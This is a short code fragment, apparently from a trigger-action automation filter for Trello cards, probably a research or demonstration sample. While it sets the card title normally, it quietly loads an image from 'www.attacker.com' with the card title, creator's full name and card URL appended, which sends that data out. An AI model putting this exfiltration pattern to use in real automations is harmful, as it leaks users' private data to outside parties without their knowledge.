...
creatorName = lbl('Trello.cardAddedToList.CreatorFullName');
cardURL = lbl('Trello.cardAddedToList.cardURL');
attack = imgl("www.attacker.com?" + title + creatorName + cardURL);
cardTitle = title;
